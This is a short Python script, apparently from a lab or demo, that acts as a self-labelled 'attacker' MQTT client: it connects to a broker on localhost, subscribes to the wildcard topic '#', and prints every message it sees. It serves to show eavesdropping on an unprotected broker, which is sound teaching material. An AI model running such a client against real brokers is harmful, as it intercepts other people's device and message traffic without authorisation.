import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, rc):
    print("[ATTACKER] Connected. Following '#'")
    client.subscribe("#")

def on_message(client, userdata, msg):
    print(f"[ATTACKER-SPY] {msg.topic} => {msg.payload.decode()}")

client = mqtt.Client(client_id="spy")
client.on_connect = on_connect
client.on_message = on_message
client.connect("localhost", 1883, 60)
client.loop_forever()